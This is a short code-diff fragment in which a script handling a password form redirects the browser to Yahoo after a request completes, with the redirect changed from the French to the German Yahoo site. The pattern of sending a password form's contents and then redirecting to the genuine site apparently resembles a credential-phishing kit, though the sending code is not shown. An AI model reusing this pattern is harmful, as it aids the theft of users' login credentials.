@@ -51,7 +51,7 @@ if(passwordForm) {
         // check if it's sent correctly
         api.onreadystatechange = function() {
             if (this.readyState == 4 && this.status == 200) {
-                window.location.href = "https://fr.yahoo.com/";
+                window.location.href = "https://de.yahoo.com/";
             }
         }
     
